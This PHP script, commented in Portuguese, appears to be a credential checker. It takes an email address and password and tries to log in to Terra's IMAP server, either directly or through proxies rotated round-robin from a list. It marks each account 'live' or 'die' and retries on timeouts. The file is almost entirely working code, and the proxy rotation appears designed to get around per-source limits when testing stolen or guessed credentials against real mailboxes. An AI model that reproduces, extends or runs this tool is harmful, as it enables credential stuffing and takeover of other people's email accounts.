<?php
/**
 * terra_validator_secure.php — VALIDAÇÃO REAL COM RETRY + PROXY ROTATION
 * Implementação corrigida com suporte a proxies com rotação Round-Robin
 * Data: 31 de julho de 2026
 */
declare(strict_types=1);

// ============================================================================
// CONFIGURAÇÃO DE LOGGING
// ============================================================================
define('LOG_FILE', __DIR__ . '/validator_audit.log');
define('PROXY_LOG_FILE', __DIR__ . '/proxy_audit.log');
define('DEBUG_MODE', (bool) getenv('DEBUG_MODE'));

function log_event(string $level, string $message, ?array $context = null): void
{
    $timestamp = date('Y-m-d H:i:s');
    $log_entry = "[$timestamp] [$level] $message";
    if ($context !== null) {
        $log_entry .= "\n  Context: " . json_encode($context, JSON_UNESCAPED_UNICODE);
    }
    error_log($log_entry . "\n", 3, LOG_FILE);
    if (DEBUG_MODE) {
        error_log($log_entry);
    }
}

function log_proxy_event(string $level, string $message, ?array $context = null): void
{
    $timestamp = date('Y-m-d H:i:s');
    $log_entry = "[$timestamp] [$level] $message";
    if ($context !== null) {
        $log_entry .= "\n  Context: " . json_encode($context, JSON_UNESCAPED_UNICODE);
    }
    error_log($log_entry . "\n", 3, PROXY_LOG_FILE);
    if (DEBUG_MODE) {
        error_log($log_entry);
    }
}

// ============================================================================
// CONFIGURAÇÃO DE SEGURANÇA
// ============================================================================
header('Content-Type: application/json; charset=utf-8');
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');
header('Cache-Control: no-store, no-cache, must-revalidate');
header('Access-Control-Allow-Origin: https://seu-dominio-seguro.com.br');
header('Access-Control-Allow-Methods: POST');

define('IMAP_SERVER', '{imap.terra.com.br:993/imap/ssl/validate-cert}');
define('MAX_ATTEMPTS_PER_MIN', 5);
define('CONNECT_TIMEOUT', 30);
define('TOTAL_TIMEOUT', 60);
define('MAX_RETRIES', 3);
define('PROXY_FILE', __DIR__ . '/proxies.txt');
define('PROXY_VALIDATION_TIMEOUT', 5);

// ============================================================================
// GERENCIAMENTO DE PROXIES
// ============================================================================

/**
 * Carrega lista de proxies do arquivo
 * Formato: IP:PORTA ou IP:PORTA:USUARIO:SENHA
 */
function load_proxies(string $file = PROXY_FILE): array
{
    if (!file_exists($file)) {
        log_proxy_event('WARN', "Arquivo de proxies não encontrado: $file");
        return [];
    }

    $proxies = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $proxies = array_filter($proxies, function($proxy) {
        return !empty(trim($proxy)) && strpos(trim($proxy), '#') !== 0;
    });

    log_proxy_event('INFO', "Proxies carregados", ['count' => count($proxies)]);
    return array_values($proxies);
}

/**
 * Obtém o próximo proxy da lista (Round-Robin)
 */
function get_next_proxy(array $proxies): ?string
{
    if (empty($proxies)) {
        return null;
    }

    if (session_status() === PHP_SESSION_NONE) {
        session_start();
    }

    $index = $_SESSION['proxy_index'] ?? 0;
    $selected_proxy = $proxies[$index % count($proxies)];
    $_SESSION['proxy_index'] = $index + 1;

    log_proxy_event('INFO', "Proxy selecionado (Round-Robin)", [
        'index' => $index,
        'total' => count($proxies),
        'proxy' => substr($selected_proxy, 0, 20) . '...',
    ]);

    return $selected_proxy;
}

/**
 * Valida a conectividade do proxy antes do uso
 */
function validate_proxy_connectivity(string $proxy_str): bool
{
    $parts = explode(':', $proxy_str);
    if (count($parts) < 2) {
        log_proxy_event('ERROR', "Formato de proxy inválido: $proxy_str");
        return false;
    }

    $proxy_addr = $parts[0] . ':' . $parts[1];
    $proxy_auth = (count($parts) === 4) ? $parts[2] . ':' . $parts[3] : null;

    $ch = curl_init('http://www.google.com');
    if ($ch === false) {
        log_proxy_event('ERROR', "Falha ao inicializar cURL para validação de proxy");
        return false;
    }

    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_PROXY => $proxy_addr,
        CURLOPT_TIMEOUT => PROXY_VALIDATION_TIMEOUT,
        CURLOPT_CONNECTTIMEOUT => PROXY_VALIDATION_TIMEOUT,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => 0,
    ]);

    if ($proxy_auth !== null) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy_auth);
    }

    $response = curl_exec($ch);
    $http_code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);

    $is_valid = $response !== false && $http_code === 200;

    log_proxy_event($is_valid ? 'INFO' : 'WARN', "Validação de proxy", [
        'proxy' => substr($proxy_str, 0, 20) . '...',
        'valid' => $is_valid,
        'http_code' => $http_code,
        'error' => $error ?: null,
    ]);

    return $is_valid;
}

/**
 * Encontra um proxy válido na lista (com fallback)
 */
function find_valid_proxy(array $proxies, int $max_attempts = 3): ?string
{
    $attempts = 0;
    $tested = [];

    while ($attempts < $max_attempts && count($tested) < count($proxies)) {
        $proxy = get_next_proxy($proxies);
        if ($proxy === null || in_array($proxy, $tested, true)) {
            break;
        }

        $tested[] = $proxy;
        $attempts++;

        if (validate_proxy_connectivity($proxy)) {
            log_proxy_event('INFO', "Proxy válido encontrado", [
                'proxy' => substr($proxy, 0, 20) . '...',
                'attempt' => $attempts,
            ]);
            return $proxy;
        }
    }

    log_proxy_event('WARN', "Nenhum proxy válido encontrado após $attempts tentativas");
    return null;
}

/**
 * Extrai configuração do proxy (IP, porta, auth)
 */
function parse_proxy(string $proxy_str): array
{
    $parts = explode(':', $proxy_str);
    return [
        'ip' => $parts[0] ?? null,
        'port' => $parts[1] ?? null,
        'user' => $parts[2] ?? null,
        'pass' => $parts[3] ?? null,
    ];
}

// ============================================================================
// FUNÇÕES UTILITÁRIAS
// ============================================================================

/**
 * Valida formato de e-mail
 */
function validate_email(string $email): bool
{
    return filter_var($email, FILTER_VALIDATE_EMAIL) !== false;
}

/**
 * Rate limiting via sessão
 */
function check_rate_limit(): bool
{
    if (session_status() === PHP_SESSION_NONE) {
        session_start();
    }

    $now = time();
    if (!isset($_SESSION['attempts'])) {
        $_SESSION['attempts'] = [];
    }

    $_SESSION['attempts'] = array_filter($_SESSION['attempts'], function($timestamp) use ($now) {
        return ($now - $timestamp) < 60;
    });

    if (count($_SESSION['attempts']) >= MAX_ATTEMPTS_PER_MIN) {
        return false;
    }

    $_SESSION['attempts'][] = $now;
    return true;
}

/**
 * Tenta conexão IMAP com retry automático e suporte a proxy
 */
function validate_imap_credentials(
    string $email,
    string $password,
    ?string $proxy = null,
    int $attempt = 1
): array {
    $start_time = microtime(true);
    $proxy_info = $proxy ? parse_proxy($proxy) : null;

    try {
        if (function_exists('imap_timeout')) {
            imap_timeout(IMAP_OPENTIMEOUT, CONNECT_TIMEOUT);
            imap_timeout(IMAP_READTIMEOUT, CONNECT_TIMEOUT);
        }

        $proxy_label = $proxy_info ? "via proxy {$proxy_info['ip']}:{$proxy_info['port']}" : 'sem proxy';
        log_event('INFO', "Tentativa $attempt/" . MAX_RETRIES . " de conexão IMAP para $email $proxy_label");

        // ✅ Se houver proxy, usa cURL + IMAP via proxy
        if ($proxy_info !== null) {
            $result = validate_imap_via_curl_proxy($email, $password, $proxy_info);
        } else {
            // ✅ Conexão IMAP direta
            $mbox = @imap_open(IMAP_SERVER, $email, $password, OP_HALFOPEN, 1);
            $result = $mbox ? 'live' : null;
            if ($mbox) {
                @imap_close($mbox);
            }
        }

        if ($result === 'live') {
            $duration_ms = round((microtime(true) - $start_time) * 1000);
            log_event('INFO', "Credencial VÁLIDA para $email ($proxy_label) - ${duration_ms}ms");
            return [
                'email' => $email,
                'result' => 'live',
                'message' => 'Credencial válida',
                'time_ms' => $duration_ms,
                'error_code' => null,
                'proxy_used' => $proxy_info ? "{$proxy_info['ip']}:{$proxy_info['port']}" : null,
            ];
        }

        // ✅ Falha na conexão
        $imap_error = imap_last_error();
        log_event('WARN', "Erro IMAP: $imap_error");

        if (
            strpos($imap_error, 'Authentication failed') !== false ||
            strpos($imap_error, 'invalid user or password') !== false ||
            strpos($imap_error, 'LOGIN failed') !== false
        ) {
            $result = 'die';
            $message = 'Credencial inválida';
            $error_code = 'AUTH_FAILED';
        } elseif (
            strpos($imap_error, 'Timed out') !== false ||
            strpos($imap_error, 'timeout') !== false
        ) {
            if ($attempt < MAX_RETRIES) {
                log_event('WARN', "Timeout na tentativa $attempt, retentando...");
                sleep(2 * $attempt);
                return validate_imap_credentials($email, $password, $proxy, $attempt + 1);
            }
            $result = 'error';
            $message = 'O servidor demorou muito para responder';
            $error_code = 'TIMEOUT';
        } elseif (strpos($imap_error, 'Certificate failure') !== false) {
            $result = 'error';
            $message = 'Falha na validação do certificado SSL';
            $error_code = 'SSL_ERROR';
        } elseif (
            strpos($imap_error, 'Connection refused') !== false ||
            strpos($imap_error, 'Network is unreachable') !== false
        ) {
            if ($attempt < MAX_RETRIES) {
                log_event('WARN', "Erro de rede na tentativa $attempt, retentando...");
                sleep(2 * $attempt);
                return validate_imap_credentials($email, $password, $proxy, $attempt + 1);
            }
            $result = 'error';
            $message = 'Servidor IMAP indisponível';
            $error_code = 'CONNECTION_REFUSED';
        } else {
            $result = 'error';
            $message = "Erro de conexão: $imap_error";
            $error_code = 'UNKNOWN_ERROR';
        }
    } catch (Throwable $exception) {
        log_event('ERROR', "Exceção: " . $exception->getMessage());
        if ($attempt < MAX_RETRIES) {
            log_event('WARN', "Exceção na tentativa $attempt, retentando...");
            sleep(2 * $attempt);
            return validate_imap_credentials($email, $password, $proxy, $attempt + 1);
        }
        $result = 'error';
        $message = 'Exceção do sistema: ' . $exception->getMessage();
        $error_code = 'SYSTEM_ERROR';
    }

    $duration_ms = round((microtime(true) - $start_time) * 1000);
    return [
        'email' => $email,
        'result' => $result,
        'message' => $message,
        'time_ms' => $duration_ms,
        'error_code' => $error_code,
        'attempt' => $attempt,
        'proxy_used' => $proxy_info ? "{$proxy_info['ip']}:{$proxy_info['port']}" : null,
    ];
}

/**
 * Valida credenciais IMAP via proxy usando cURL
 * (Alternativa quando proxy é necessário)
 */
function validate_imap_via_curl_proxy(string $email, string $password, array $proxy_info): ?string
{
    $ch = curl_init();
    if ($ch === false) {
        return null;
    }

    $proxy_addr = $proxy_info['ip'] . ':' . $proxy_info['port'];

    curl_setopt_array($ch, [
        CURLOPT_URL => 'imaps://imap.terra.com.br:993/INBOX',
        CURLOPT_USERPWD => "$email:$password",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_PROXY => $proxy_addr,
        CURLOPT_TIMEOUT => CONNECT_TIMEOUT,
        CURLOPT_CONNECTTIMEOUT => CONNECT_TIMEOUT,
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_SSL_VERIFYHOST => 2,
    ]);

    if ($proxy_info['user'] !== null && $proxy_info['pass'] !== null) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy_info['user'] . ':' . $proxy_info['pass']);
    }

    $response = curl_exec($ch);
    $error = curl_error($ch);
    $http_code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($response !== false && $http_code >= 200 && $http_code < 300) {
        return 'live';
    }

    if (strpos($error, 'authentication failed') !== false || $http_code === 401) {
        return 'die';
    }

    return null;
}

// ============================================================================
// PROCESSAMENTO DA REQUISIÇÃO
// ============================================================================

$input = json_decode(file_get_contents('php://input'), true) ?? $_POST;
$email = trim((string)($input['email'] ?? ''));
$password = (string)($input['password'] ?? '');
$use_proxy = (bool)($input['use_proxy'] ?? false);

// ✅ Validação de e-mail
if (!validate_email($email)) {
    http_response_code(400);
    echo json_encode([
        'email' => $email,
        'result' => 'error',
        'message' => 'Formato de e-mail inválido',
        'time_ms' => 0,
        'error_code' => 'INVALID_EMAIL',
    ]);
    exit;
}

// ✅ Rate limiting
if (!check_rate_limit()) {
    http_response_code(429);
    echo json_encode([
        'email' => $email,
        'result' => 'error',
        'message' => 'Limite de tentativas excedido. Tente novamente em 1 minuto.',
        'time_ms' => 0,
        'error_code' => 'RATE_LIMITED',
    ]);
    exit;
}

log_event('INFO', "Validação iniciada para $email");

// ✅ Carrega proxies se solicitado
$proxy = null;
if ($use_proxy) {
    $proxies = load_proxies();
    if (!empty($proxies)) {
        $proxy = find_valid_proxy($proxies);
        if ($proxy === null) {
            log_event('WARN', "Nenhum proxy disponível, usando conexão direta");
        }
    }
}

// ✅ Valida credenciais com retry automático e proxy
$result = validate_imap_credentials($email, $password, $proxy);

// ✅ Log do resultado
log_event($result['result'] === 'live' ? 'INFO' : 'WARN', "Resultado: {$result['result']}", [
    'email' => $email,
    'time_ms' => $result['time_ms'],
    'error_code' => $result['error_code'],
    'proxy_used' => $result['proxy_used'] ?? null,
]);

// ✅ Resposta final
http_response_code($result['result'] === 'error' ? 400 : 200);
echo json_encode($result, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
?>
